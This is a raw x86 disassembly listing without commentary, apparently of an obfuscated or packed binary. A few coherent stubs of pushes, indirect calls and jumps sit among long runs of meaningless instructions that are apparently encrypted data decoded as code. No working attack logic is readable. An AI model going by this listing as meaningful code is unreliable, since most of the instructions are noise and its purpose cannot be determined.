  403f6c:	mov    eax,0x91b413f9
  403f71:	inc    edx
  403f72:	scas   eax,DWORD PTR es:[edi]
  403f73:	mov    WORD PTR [esi],cs
  403f75:	fstp   QWORD PTR [ebx+0x4b]
  403f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f79:	mov    eax,0xd908b07
  403f7e:	push   esi
  403f7f:	pushf  
  403f80:	adc    cl,dl
  403f82:	jno    0x403f12
  403f84:	and    bl,ah
  403f86:	and    bl,dh
  403f88:	sbb    ch,ch
  403f8a:	and    eax,0x70807a7d
  403f8f:	repnz dec edx
  403f91:	out    dx,al
  403f92:	sbb    bh,dh
  403f94:	inc    eax
  403f95:	leave  
  403f96:	enter  0xbc8a,0xcf
  403f9a:	test   BYTE PTR [eax],dl
  403f9c:	int    0xcc
  403f9e:	adc    BYTE PTR [ebx-0x75362e7e],bh
  403fa4:	adc    edx,DWORD PTR [edi+edi*2+0x44e3784d]
  403fab:	sbb    bh,BYTE PTR [edx-0x536ad085]
  403fb1:	daa    
  403fb2:	(bad)  
  403fb3:	rcr    BYTE PTR [edx-0x18],1
  403fb6:	es push es
  403fb8:	and    ecx,DWORD PTR [ecx+0x21c3ae5]
  403fbe:	jecxz  0x403f55
  403fc0:	pop    ss
  403fc1:	mov    cl,0xc9
  403fc3:	ins    BYTE PTR es:[edi],dx
  403fc4:	xchg   esi,eax
  403fc5:	sbb    DWORD PTR ds:0xf6d36c12,edx
  403fcb:	test   eax,0x171578e4
  403fd0:	scas   eax,DWORD PTR es:[edi]
  403fd1:	sub    edx,DWORD PTR [eax-0x5b]
  403fd4:	jnp    0x404010
  403fd6:	sub    DWORD PTR [eax+0x26],esi
  403fd9:	arpl   si,ax
  403fdb:	out    dx,eax
  403fdc:	cmp    eax,0x2fe4eb23
  403fe1:	ror    DWORD PTR [ebx],0xff
  403fe4:	arpl   WORD PTR [ebp-0x9badf91],di
  403fea:	inc    ebx
  403feb:	(bad)
  403fee:	adc    eax,0x94a72083
  403ff3:	add    eax,0xa8c71285
  403ff8:	and    DWORD PTR [eax],ecx
  403ffa:	jns    0x403ff2
  403ffc:	scas   al,BYTE PTR es:[edi]
  403ffd:	outs   dx,BYTE PTR ds:[esi]
  403ffe:	aas    
  403fff:	mov    ebp,0xd65de6b6
  404004:	jmp    0xbc95c0c7
  404009:	leave  
  40400a:	ja     0x403fb7
  40400c:	adc    ch,BYTE PTR [edi]
  40400e:	cmp    BYTE PTR [edi],bh
  404010:	jae    0x403fbf
  404012:	jmp    0xd924b6ae
  404017:	mov    ds:0xc56837b9,eax
  40401c:	adc    ebp,eax
  40401e:	sbb    ch,BYTE PTR [edi-0x6ec2c4f3]
  404024:	pusha  
  404025:	push   edi
  404026:	call   0xef53a4b4
  40402b:	sub    esp,DWORD PTR [edx+0x7418d427]
  404031:	fadd   QWORD PTR [edi]
  404033:	adc    eax,0xd6b8a44
  404038:	not    DWORD PTR [edx]
  40403a:	mov    ch,0xad
  40403c:	push   edx
  40403d:	jb     0x404009
  40403f:	ret    0x50bf
  404042:	inc    ecx
  404043:	pusha  
  404044:	or     al,0x58
  404046:	mov    ch,0x39
  404048:	dec    esp
  404049:	loop   0x40409d
  40404b:	xor    DWORD PTR [esi-0x3f],ebx
  40404e:	lods   eax,DWORD PTR ds:[esi]
  40404f:	mov    edx,0x68baab4a
  404054:	sub    DWORD PTR [ebp+eax*1-0x3c],eax
  404058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404059:	lock xchg ebx,eax
  40405b:	xor    eax,0xe9b3166e
  404060:	imul   edi,DWORD PTR cs:[esi-0x50a1c11c],0xada734e5
  40406b:	xor    ch,BYTE PTR [ecx*4+0xb4fbc41]
  404072:	adc    ebp,DWORD PTR [ebp-0x29227d89]
  404078:	dec    ebp
  404079:	or     bh,BYTE PTR [ebx]
  40407b:	push   esi
  40407c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40407d:	(bad)  
  40407e:	loopne 0x404002
  404080:	pop    ss
  404081:	pop    esp
  404082:	push   es
  404083:	scas   al,BYTE PTR es:[edi]
  404084:	pop    ss
  404085:	in     eax,0xe3
  404087:	mul    BYTE PTR [ebp+0x3c]
  40408a:	jns    0x4040d7
  40408c:	xchg   edi,eax
  40408d:	push   0xffffffa4
  40408f:	fcomp  st(5)
  404091:	mov    DWORD PTR [edi+0x70bffd3e],esi
  404097:	or     esp,edx
  404099:	add    DWORD PTR [edx+0x6e],0xffffffca
  40409d:	mov    cl,0xfa
  40409f:	jecxz  0x4040ac
  4040a1:	jno    0x4040c8
  4040a3:	mov    al,BYTE PTR [ecx-0x3f]
  4040a6:	xchg   edx,eax
  4040a7:	pushf  
  4040a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040a9:	dec    esi
  4040aa:	scas   eax,DWORD PTR es:[edi]
  4040ab:	pop    ss
  4040ac:	stc    
  4040ad:	jns    0x404063
  4040af:	into   
  4040b0:	inc    esi
  4040b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040b2:	fimul  DWORD PTR [esi-0x69]
  4040b5:	xor    eax,0xd5e82ecd
  4040ba:	dec    edx
  4040bb:	je     0x40407b
  4040bd:	imul   DWORD PTR [edi+0x76]
  4040c0:	mov    edi,0x574109bf
  4040c5:	xchg   DWORD PTR [esi],ebp
  4040c7:	xor    DWORD PTR [ebx+edx*4],esi
  4040ca:	data16 fdivr QWORD PTR [esi+edx*4+0x43]
  4040cf:	out    dx,eax
  4040d0:	ss call 0x1171:0xc450eb4b
  4040d8:	pop    esp
  4040d9:	xor    DWORD PTR [eax],edx
  4040db:	mov    ds:0xb124e3c5,eax
  4040e0:	outs   dx,DWORD PTR ds:[esi]
  4040e1:	mov    ch,0x5a
  4040e3:	fstp   QWORD PTR [ecx]
  4040e5:	jb     0x4040d9
  4040e7:	xor    al,0x6c
  4040e9:	push   0xe7ffbe49
  4040ee:	or     ah,dl
  4040f0:	ret    
  4040f1:	outs   dx,DWORD PTR ds:[esi]
  4040f2:	repz fcomip st,st(6)
  4040f5:	in     eax,0xde
  4040f7:	adc    edx,DWORD PTR [ecx-0xc]
  4040fa:	cli    
  4040fb:	xor    DWORD PTR [edi-0x3d],eax
  4040fe:	pop    eax
  4040ff:	popf   
  404100:	and    al,0x3b
  404102:	test   DWORD PTR [esi+eiz*8],ebx
  404105:	push   esi
  404106:	jns    0x40412a
  404108:	pop    es
  404109:	push   cs
  40410a:	jnp    0x404131
  40410c:	push   0x1332dd79
  404111:	in     al,dx
  404112:	push   edx
  404113:	jns    0x4040d0
  404115:	ds fcom st(4)
  404118:	xor    al,0x62
  40411a:	cmp    ah,BYTE PTR [eax+0x54804bfa]
  404120:	jmp    0x4040fc
  404122:	xor    eax,0x15ca8a26
  404127:	test   BYTE PTR [edi],al
  404129:	pushw  es
  40412b:	mov    WORD PTR [edx-0x50154c4c],ds
  404131:	das    
  404132:	(bad)  
  404133:	out    dx,eax
  404134:	test   ch,0x3e
  404137:	pushf  
  404138:	loope  0x40412d
  40413a:	add    eax,0x50f89a9f
  40413f:	call   0x4525:0xaed0d5c3
  404146:	jmp    0x4040e1
  404148:	xchg   ebx,eax
  404149:	mov    al,0xa8
  40414b:	mov    dh,0xda
  40414d:	sub    dl,BYTE PTR [esi+0x7c]
  404150:	adc    DWORD PTR [esi+0x50],edi
  404153:	push   ss
  404154:	lock push eax
  404156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404157:	mov    edx,0x86bbc58
  40415c:	jmp    0x4040f8
  40415e:	lods   al,BYTE PTR ds:[esi]
  40415f:	sub    al,0xd5
  404161:	mov    edx,0x72e30f3a
  404166:	dec    BYTE PTR [ebx-0xc23a94]
  40416c:	push   0xb4bd3fd8
  404171:	adc    cl,ch
  404173:	pop    es
  404174:	cmc    
  404175:	jmp    0xd92f:0x79dba789
  40417c:	jae    0x40416e
  40417e:	pop    es
  40417f:	jg     0x4041cd
  404181:	jmp    0x404149
  404183:	ret    
  404184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404186:	dec    edx
  404187:	popa   
  404188:	sub    eax,DWORD PTR [esi]
  40418a:	push   ebx
  40418b:	push   ds
  40418c:	jo     0x40410e
  40418e:	in     al,dx
  40418f:	dec    esi
  404190:	ret    0x9878
  404193:	(bad)  
  404194:	(bad)  
  404195:	outs   dx,DWORD PTR ds:[esi]
  404196:	cmp    esi,edx
  404198:	xor    DWORD PTR [edx+0x5d],ebp
  40419b:	pop    ebp
  40419c:	cmp    eax,0x12a29296
  4041a1:	fdivr  DWORD PTR [ebp+0x3fc4bf9c]
  4041a7:	loop   0x404215
  4041a9:	xchg   edi,eax
  4041aa:	inc    esi
  4041ab:	pusha  
  4041ac:	mov    esi,0xd802e558
  4041b1:	lock cld 
  4041b3:	ins    BYTE PTR es:[edi],dx
  4041b4:	ins    BYTE PTR es:[edi],dx
  4041b5:	test   BYTE PTR [esi-0x6a],dh
  4041b8:	imul   edi,DWORD PTR [edi+ebx*8+0x109bb5],0x5ac4af0b
  4041c3:	mov    ds:0x40279d88,al
  4041c8:	push   edx
  4041c9:	imul   esi,DWORD PTR [ebx+0x14],0x5807cb97
  4041d0:	sub    DWORD PTR [ecx-0x4cab1b40],0x5
  4041d7:	outs   dx,BYTE PTR ds:[esi]
  4041d8:	jmp    0x12a:0xf5a9252d
  4041df:	jo     0x404186
  4041e1:	cmp    BYTE PTR [ebx],bl
  4041e3:	pop    edx
  4041e4:	mov    eax,ds:0x5c9ffe9d
  4041e9:	adc    dl,BYTE PTR [esi+0x4293dc91]
  4041ef:	xor    al,0xee
  4041f1:	jns    0x4041a6
  4041f3:	or     DWORD PTR [ebx+ebx*8-0x1e21c2c5],ebp
  4041fa:	mov    eax,0xd9eed297
  4041ff:	sbb    al,0x75
  404201:	mov    esp,0x28d052ef
  404206:	mov    bh,BYTE PTR [edx]
  404208:	adc    BYTE PTR [esi+0x74f98ac0],al
  40420e:	outs   dx,DWORD PTR ds:[esi]
  40420f:	xchg   ecx,edx
  404211:	dec    BYTE PTR [edx]
  404213:	push   DWORD PTR [ebp-0x18]
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si-0x24],0x53
  404248:	fidivr DWORD PTR [ecx-0x2b]
  40424b:	and    eax,0x7d6f7e7e
  404250:	jle    0x4042d0
  404252:	das    
  404253:	jmp    0xef0e718
  404258:	(bad)  [ecx+0x285bfdd5]
  40425e:	jp     0x4042b1
  404260:	sbb    eax,0x9b9fc059
  404265:	add    BYTE PTR [edx-0x15],ah
  404268:	in     al,0x70
  40426a:	loopne 0x404251
  40426c:	(bad)  
  40426d:	sub    al,0xcf
  40426f:	xchg   ebx,eax
  404270:	dec    ecx
  404271:	adc    al,0xee
  404273:	bound  edi,QWORD PTR [ebx]
  404275:	dec    ecx
  404276:	out    0xac,eax
  404278:	std    
  404279:	or     DWORD PTR [edx-0x26],0x5f572357
  404280:	mov    cl,0x4d
  404282:	into   
  404283:	mov    edi,0xdc98aa48
  404288:	dec    eax
  404289:	fst    DWORD PTR [ebp+0x73aa3e2a]
  40428f:	and    ebx,DWORD PTR [esi]
  404291:	data16 sub BYTE PTR [edx],bl
  404294:	dec    edx
  404295:	mov    ds:0x6c1da40f,al
  40429a:	jp     0x40423c
  40429c:	into   
  40429d:	fcomip st,st(4)
  40429f:	dec    edi
  4042a0:	and    al,0xd7
  4042a2:	dec    eax
  4042a3:	pop    ss
  4042a4:	les    ecx,FWORD PTR [edi+0x62bb8827]
  4042aa:	add    bh,BYTE PTR [edi]
  4042ac:	mov    esp,0x4ba2b011
  4042b1:	int3   
  4042b2:	mov    ebx,DWORD PTR [ecx]
  4042b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042b5:	mov    ebp,0x8dd104a4
  4042ba:	pop    ecx
  4042bb:	out    dx,eax
  4042bc:	dec    ebx
  4042bd:	jbe    0x4042c3
  4042bf:	mov    WORD PTR [edx+0x60],?
  4042c2:	leave  
  4042c3:	repz cmp ecx,DWORD PTR [edi]
  4042c6:	pop    ecx
  4042c7:	sbb    DWORD PTR [esi+0x6f38dab1],0xffffffa5
  4042ce:	adc    al,0x2f
  4042d0:	jg     0x40427f
  4042d2:	(bad)  
  4042d3:	and    al,0x41
  4042d5:	mov    ebx,0xc1d474e0
  4042da:	mov    bh,0xaa
  4042dc:	push   cs
  4042dd:	push   ss
  4042de:	fldcw  WORD PTR [esi-0x4706a206]
  4042e4:	cmp    bl,cl
  4042e6:	xchg   esp,eax
  4042e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042e8:	not    eax
  4042ea:	mov    eax,ds:0x76e952a
  4042ef:	fst    QWORD PTR [edx+0x56c75218]
  4042f5:	adc    ch,BYTE PTR [edi]
  4042f7:	xchg   ecx,eax
  4042f8:	xchg   ecx,ebp
  4042fa:	dec    ecx
  4042fb:	or     eax,0x6acf91a4
  404300:	stc    
  404301:	shl    DWORD PTR [ebp-0x54],cl
  404304:	inc    eax
  404305:	adc    esi,DWORD PTR [ecx+0xd]
  404308:	inc    edi
  404309:	cmp    al,0xdd
  40430b:	add    cl,al
  40430d:	stc    
  40430e:	mov    ch,BYTE PTR [esi+0x51406220]
  404314:	cdq    
  404315:	fmulp  st(1),st
  404317:	fimul  WORD PTR [edi+0xa]
  40431a:	mov    ds:0x3d66e5e5,eax
  40431f:	cmc    
  404320:	jmp    0x404362
  404322:	test   BYTE PTR [ecx-0x25b470e1],al
  404328:	bound  edx,QWORD PTR [esi+0x2a43f31f]
  40432e:	jnp    0x404337
  404330:	iret   
  404331:	int    0xb8
  404333:	clc    
  404334:	and    eax,0xaa7ff028
  404339:	xchg   esp,eax
  40433a:	out    dx,al
  40433b:	mov    cl,0xf9
  40433d:	aas    
  40433e:	(bad)  
  404340:	in     al,dx
  404341:	inc    edx
  404342:	jo     0x4042ca
  404344:	loop   0x4042d2
  404346:	xor    edx,DWORD PTR ds:0xe6c9cca6
  40434c:	pop    ecx
  40434d:	pop    edx
  40434e:	xor    DWORD PTR ds:0xe1e09329,esp
  404354:	jecxz  0x4042e1
  404356:	inc    edx
  404357:	mov    edi,0xe3e130db
  40435c:	dec    esi
  40435d:	dec    esp
  40435e:	out    0x9a,al
  404360:	sub    eax,0x6bceb386
  404365:	pop    esp
  404366:	adc    BYTE PTR [ebx],dl
  404368:	jnp    0x40431f
  40436a:	ja     0x4043cf
  40436c:	(bad)  
  40436e:	js     0x404324
  404370:	cmp    ebx,DWORD PTR [edi]
  404372:	pop    esi
  404373:	add    cl,dl
  404375:	sbb    dl,BYTE PTR [edi-0x1ce1abe7]
  40437b:	inc    ebx
  40437c:	gs push cs
  40437e:	jge    0x40436a
  404380:	fstp   st(5)
  404382:	dec    ebx
  404383:	ja     0x4043f7
  404385:	rcl    bh,cl
  404387:	outs   dx,DWORD PTR ds:[esi]
  404388:	popa   
  404389:	mov    ecx,DWORD PTR [eax-0x28a7bbc8]
  40438f:	fild   WORD PTR [edx+0x5a]
  404392:	test   eax,0xc85bf6f8
  404397:	fiadd  WORD PTR es:[ecx-0x9]
  40439b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40439c:	pop    ebp
  40439d:	stc    
  40439e:	jmp    0x404373
  4043a0:	repnz xchg esi,eax
  4043a2:	fidivr DWORD PTR [edx]
  4043a4:	or     ebp,DWORD PTR [eax+0x877bf04]
  4043aa:	xor    ebx,DWORD PTR [esi-0x61]
  4043ad:	add    ch,BYTE PTR [esi-0x48]
  4043b0:	loop   0x404349
  4043b2:	cmc    
  4043b3:	test   eax,0x5bc5d66a
  4043b8:	pop    esp
  4043b9:	xchg   DWORD PTR [edi+0x17],ebp
  4043bc:	adc    dh,BYTE PTR [edx+edi*1]
  4043bf:	xchg   ebx,eax
  4043c0:	or     ch,dl
  4043c2:	inc    esp
  4043c3:	cld    
  4043c4:	lock cmp BYTE PTR [ecx+0x5bfdd6bc],0xfa
  4043cc:	mov    BYTE PTR [esi-0x3f],bh
  4043cf:	scas   eax,DWORD PTR es:[edi]
  4043d0:	add    DWORD PTR [ebx-0x1],eax
  4043d3:	adc    al,0x16
  4043d5:	dec    edi
  4043d6:	int3   
  4043d7:	repz mov dl,0x5c
  4043da:	stos   BYTE PTR es:[edi],al
  4043db:	mov    esp,0xfed7e6f1
  4043e0:	inc    esi
  4043e1:	ret    
  4043e2:	xchg   edi,eax
  4043e3:	aas    
  4043e4:	test   eax,0xb8cf269e
  4043e9:	and    al,0xb9
  4043eb:	add    al,0x88
  4043ed:	int3   
  4043ee:	mov    dh,0x14
  4043f0:	jo     0x40438c
  4043f2:	daa    
  4043f3:	dec    esp
  4043f4:	cld    
  4043f5:	aad    0xa
  4043f7:	adc    DWORD PTR [edx-0x7a],esi
  4043fa:	or     eax,ecx
  4043fc:	loop   0x4043b0
  4043fe:	shl    al,cl
  404400:	add    BYTE PTR [edx+0x448cbfdc],bl
  404406:	and    ecx,DWORD PTR [esp+ebp*8-0x51]
  40440a:	add    BYTE PTR [ebx+eax*8+0x3ebe3ff6],ah
  404411:	xor    bh,bh
  404413:	pop    ds
  404414:	dec    esp
  404415:	test   al,0x6
  404417:	nop
  404418:	push   0xffffffb6
  40441a:	lods   eax,DWORD PTR ds:[esi]
  40441b:	xchg   ebx,eax
  40441c:	icebp  
  40441d:	in     eax,0x5
  40441f:	enter  0xd05e,0xe6
  404423:	outs   dx,BYTE PTR ds:[esi]
  404424:	mov    cl,0x45
  404426:	dec    eax
  404427:	push   cs
  404428:	push   esp
  404429:	outs   dx,BYTE PTR ds:[esi]
  40442a:	inc    edx
  40442b:	mov    ch,al
  40442d:	sub    DWORD PTR [eax],edi
  40442f:	aam    0xa2
  404431:	test   eax,0x43cabcfe
  404436:	mov    gs,ebx
  404438:	mov    dh,BYTE PTR [edx]
  40443a:	mov    edx,0x3512cf8f
  40443f:	cmc    
  404440:	pusha  
  404441:	xor    eax,0x590d3518
  404446:	dec    esi
  404447:	rol    ecx,1
  404449:	data16 jecxz 0x40442f
  40444c:	jno    0x40447c
  40444e:	out    0x6e,al
  404450:	add    al,0x71
  404452:	outs   dx,DWORD PTR ds:[esi]
  404453:	iret   
  404454:	sbb    DWORD PTR [ecx],esi
  404456:	cmp    bl,0x13
  404459:	push   edi
  40445a:	dec    edx
  40445b:	xchg   bl,dh
  40445d:	jle    0x4044c3
  40445f:	js     0x404460
  404461:	pop    ss
  404462:	xchg   esi,eax
  404463:	sbb    al,BYTE PTR [edx+0x6a1c588d]
  404469:	jno    0x4043ff
  40446b:	sub    al,0x28
  40446d:	repnz xor eax,DWORD PTR [ecx+ecx*1]
  404471:	xchg   ecx,eax
  404472:	mov    edx,0x980be821
  404477:	or     al,0x46
  404479:	mov    ss,WORD PTR [edi-0x773f94f8]
  40447f:	xchg   esi,eax
  404480:	mov    eax,ds:0x4fc7ac3c
  404485:	in     eax,0x75
  404487:	add    al,0x43
  404489:	inc    ecx
  40448a:	data16 jecxz 0x40441f
  40448d:	in     al,dx
  40448e:	xor    ecx,edx
  404490:	pop    eax
  404491:	xor    BYTE PTR [edx-0x41522e12],bl
  404497:	pop    edx
  404498:	sbb    DWORD PTR [edi],esp
  40449a:	mov    al,0xd7
  40449c:	das    
  40449d:	retf   0x9843
  4044a0:	sar    BYTE PTR [edi+ebx*4],0xff
  4044a4:	adc    BYTE PTR ds:0x7676e203,cl
  4044aa:	sbb    al,0x68
  4044ac:	dec    ebx
  4044ad:	out    0x47,al
  4044af:	jg     0x40451f
  4044b1:	adc    edx,DWORD PTR [eax+0x2702d7a2]
  4044b7:	lds    eax,FWORD PTR [ebx]
  4044b9:	sub    eax,0x3ddfbd5b
  4044be:	inc    ebx
  4044bf:	call   0x60817ae2
  4044c4:	mov    ds:0x2d6a85b2,al
  4044c9:	push   ebp
  4044ca:	daa    
  4044cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044cc:	cmp    DWORD PTR [edx-0x19721868],edi
  4044d2:	or     BYTE PTR [ecx+0x55],ch
  4044d5:	lock jle 0x404468
  4044d8:	and    DWORD PTR [ebx-0x5492d519],ebp
  4044de:	mov    edx,es
  4044e0:	adc    al,0x9c
  4044e2:	cwde   
  4044e3:	les    edi,FWORD PTR [esi+0x50]
  4044e6:	jae    0x40446c
  4044e8:	mov    dl,0x80
  4044ea:	fimul  DWORD PTR [eax]
  4044ec:	inc    edi
  4044ed:	out    dx,al
  4044ee:	je     0x404474
  4044f0:	cli    
  4044f1:	out    0x64,eax
  4044f3:	repz mov eax,0x2544b79d
  4044f9:	push   0x989f6cf4
  4044fe:	xchg   ebp,eax
  4044ff:	nop
  404500:	rol    DWORD PTR [ebx],0xc8
  404503:	jo     0x4044cf
  404505:	(bad)  
  404506:	and    dh,bl
  404508:	xchg   BYTE PTR [edi],cl
  40450a:	xchg   edx,eax
  40450b:	pop    eax
  40450c:	lods   eax,DWORD PTR ds:[esi]
  40450d:	rol    DWORD PTR [edx],cl
  40450f:	in     eax,dx
  404510:	or     BYTE PTR [ebp-0x66e6d84b],dh
  404516:	out    dx,al
  404517:	jno    0x4044cb
  404519:	dec    ebx
  40451a:	mov    al,BYTE PTR [esi+0x27]
  40451d:	sub    al,0x59
  40451f:	out    dx,eax
  404520:	cli    
  404521:	xlat   BYTE PTR ds:[ebx]
  404522:	jmp    0xc6bd:0x7089fffb
  404529:	mov    ecx,0xc6fb0de2
  40452e:	loope  0x40456f
  404530:	outs   dx,DWORD PTR ds:[esi]
  404531:	cmp    eax,0x35d683cd
  404536:	imul   esp,DWORD PTR [eax-0x7c],0x6d
  40453a:	sub    ah,bh
  40453c:	push   cs
  40453d:	sub    eax,0xf6e9daf6
  404542:	mov    ebx,0x8e9d1d95
  404547:	cli    
  404548:	stc    
  404549:	mov    eax,0x8a203071
  40454e:	sub    eax,0xd6c56293
  404553:	xor    eax,0x208a735
  404558:	loope  0x4044f1
  40455a:	adc    al,0x83
  40455c:	mov    al,0x19
  40455e:	add    cl,bh
  404560:	pop    esi
  404561:	mov    dh,0x93
  404563:	mov    WORD PTR [eax],?
  404565:	loopne 0x40457c
  404567:	adc    DWORD PTR [edi+ebp*1-0x2e],ecx
  40456b:	movd   DWORD PTR [ebx+0x1c],mm5
  40456f:	adc    eax,0x40fe0fe3
  404574:	(bad)  
  404575:	mul    BYTE PTR [eax+eax*4+0x7e35509f]
  40457c:	out    dx,al
  40457d:	cwde   
  40457e:	test   BYTE PTR [ebx-0x7d],bh
  404581:	xchg   ebx,eax
  404582:	js     0x4045fb
  404584:	clc    
  404585:	jnp    0x404532
  404587:	pusha  
  404588:	xchg   esp,eax
  404589:	jmp    0x131:0x1bbff020
  404590:	sub    eax,0x54aca3aa
  404595:	add    eax,0xa7d07769
  40459a:	push   eax
  40459b:	ror    BYTE PTR [eax-0x25],cl
  40459e:	sar    BYTE PTR [edx],cl
  4045a0:	adc    DWORD PTR [ebx-0x411d6ae4],0xffffffa0
  4045a7:	ds out 0x70,eax
  4045aa:	rcr    BYTE PTR [edi-0x4da2c8a7],0x1e
  4045b1:	xor    eax,0xb8d7f2e8
  4045b7:	test   al,0x80
  4045b9:	into   
  4045ba:	xchg   edi,eax
  4045bb:	call   0xaf4c:0x6115d881
  4045c2:	fild   QWORD PTR [ebx]
  4045c4:	sbb    BYTE PTR [esi+0x38082649],cl
  4045ca:	es je  0x404595
  4045cd:	test   DWORD PTR [ebp-0x275a8861],ecx
  4045d3:	push   eax
  4045d4:	sbb    eax,0x79c3df23
  4045d9:	ret    0x5eb1
  4045dc:	cs mov ebx,0xd9b953a4
  4045e2:	into   
  4045e3:	add    DWORD PTR [esi+0x7d],esp
  4045e6:	adc    dl,dl
  4045e8:	dec    ecx
  4045e9:	and    dl,dh
  4045eb:	dec    ebx
  4045ec:	cmp    al,0x26
  4045ee:	ret    0x93f6
  4045f1:	sbb    BYTE PTR [eax],cl
  4045f3:	jae    0x404657
  4045f5:	and    bh,ah
  4045f7:	cmp    esp,DWORD PTR [edi-0x1c8bb205]
  4045fd:	mov    ds:0xe6bf5843,eax
  404602:	dec    esp
  404603:	push   es
  404604:	mov    eax,0x1b012a43
  404609:	iret   
  40460a:	loopne 0x4045eb
  40460c:	and    DWORD PTR [eax+0x75],0x6b6182d
  404613:	pop    ecx
  404614:	fnstsw WORD PTR [ebx+0x247c509c]
  40461a:	mov    dl,0x17
  40461c:	pop    ds
  40461d:	pop    ebx
  40461e:	hlt    
  40461f:	cs icebp 
  404621:	shl    BYTE PTR [edx+eiz*2+0x67],0xc7
  404626:	jae    0x404665
  404628:	lock mov bl,0x72
  40462b:	jo     0x4045e7
  40462d:	inc    esp
  40462e:	mov    WORD PTR [esi+0x66],fs
  404631:	xchg   esp,eax
  404632:	push   edx
  404633:	jae    0x4046b0
  404635:	push   es
  404636:	pop    eax
  404637:	fcmovnbe st,st(1)
  404639:	push   es
  40463a:	mov    WORD PTR [ecx+0x40],es
  40463d:	adc    edi,DWORD PTR [ebx+0x15728df9]
  404643:	push   DWORD PTR [eax]
  404645:	lea    eax,ds:0x413dc2
  40464b:	push   DWORD PTR [eax]
  40464d:	xchg   ebx,edx
  40464f:	inc    ebx
  404650:	inc    ebx
  404651:	push   ebx
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0x803979e3
  404675:	in     eax,dx
  404676:	ret    0x7e21
  404679:	jle    0x4046ea
  40467b:	jge    0x4046fb
  40467d:	jle    0x4046f9
  40467f:	pop    ds
  404680:	sub    dh,BYTE PTR [eax-0x4ca84a9a]
  404686:	or     ebp,DWORD PTR [edi+0x2e]
  404689:	jmp    DWORD PTR [ebx-0x14]
  40468c:	shr    BYTE PTR [eax-0x52113eec],cl
  404692:	es icebp 
  404694:	sub    DWORD PTR [ecx+0x4b],esi
  404697:	enter  0x6d4d,0x5b
  40469b:	xchg   BYTE PTR [edx-0x5],bl
  40469e:	(bad)  
  40469f:	fwait
  4046a0:	pop    edx
  4046a1:	xrelease xchg BYTE PTR gs:[edx+0x27],cl
  4046a6:	xor    bh,dl
  4046a8:	(bad)  
  4046a9:	test   eax,0x9c05cd0e
  4046ae:	mov    esi,ebx
  4046b0:	mov    al,ds:0xc75712a0
  4046b5:	and    esi,DWORD PTR [ebx+0x27fd276c]
  4046bb:	xchg   ecx,eax
  4046bc:	popf   
  4046bd:	push   0xfffffffb
  4046bf:	cmp    ah,BYTE PTR [ebp-0x5a0d60be]
  4046c5:	adc    esi,DWORD PTR [ecx]
  4046c7:	int    0x93
  4046c9:	xor    ecx,esp
  4046cb:	xchg   DWORD PTR [ebx+0x69411674],ecx
  4046d1:	mov    BYTE PTR [edx],al
  4046d3:	mov    dl,0x92
  4046d5:	jecxz  0x404688
  4046d7:	jnp    0x4046b9
  4046d9:	mov    edi,0x264296c9
  4046de:	jge    0x404694
  4046e0:	(bad)
  4046e3:	lock data16 fld DWORD PTR [ebp+0x41]
  4046e8:	stos   BYTE PTR es:[edi],al
  4046e9:	rol    ah,0x13
  4046ec:	rcr    eax,1
  4046ee:	xor    ch,0x9a
  4046f1:	scas   eax,DWORD PTR es:[edi]
  4046f2:	pop    es
  4046f3:	retf   
  4046f4:	xchg   ebx,eax
  4046f5:	jge    0x404717
  4046f7:	shl    DWORD PTR [edx-0x52a7878a],cl
  4046fd:	and    eax,0xa6730881
  404702:	inc    ebp
  404703:	sub    al,0x20
  404705:	fadd   st,st(3)
  404707:	mov    esi,0x75d8b9ee
  40470c:	les    esi,FWORD PTR [edx+0x72]
  40470f:	out    0xe1,eax
  404711:	fldenv [esi+0x25827793]
  404717:	and    al,0xa9
  404719:	mov    BYTE PTR [edi+0x7a5e7208],ch
  40471f:	and    edx,DWORD PTR [eax]
  404721:	jnp    0x40474b
  404723:	in     eax,dx
  404724:	push   edi
  404725:	pusha  
  404726:	scas   eax,DWORD PTR es:[edi]
  404727:	pop    eax
  404728:	mov    esi,0x9daa7809
  40472d:	stos   BYTE PTR es:[edi],al
  40472e:	xchg   edx,eax
  40472f:	xor    BYTE PTR [ebp-0x16b56c9a],0x41
  404736:	push   esp
  404737:	mov    esp,0xd76b2b1a
  40473c:	push   0x5b184569
  404741:	inc    ebp
  404742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404743:	loope  0x4046fb
  404745:	jg     0x4046d1
  404747:	push   ds
  404748:	mov    ah,0x7e
  40474a:	ret    0xca13
  40474d:	jp     0x404751
  40474f:	(bad)  
  404750:	sbb    eax,0xc97ed027
  404755:	push   esp
  404756:	fisubr DWORD PTR [ecx]
  404758:	jb     0x404747
  40475a:	pop    es
  40475b:	jge    0x404789
  40475d:	out    dx,al
  40475e:	mov    ds:0x2795d165,eax
  404763:	pop    esp
  404764:	inc    edi
  404765:	dec    ecx
  404766:	ds pop ebx
  404768:	test   DWORD PTR [esi],0x78f1a3e0
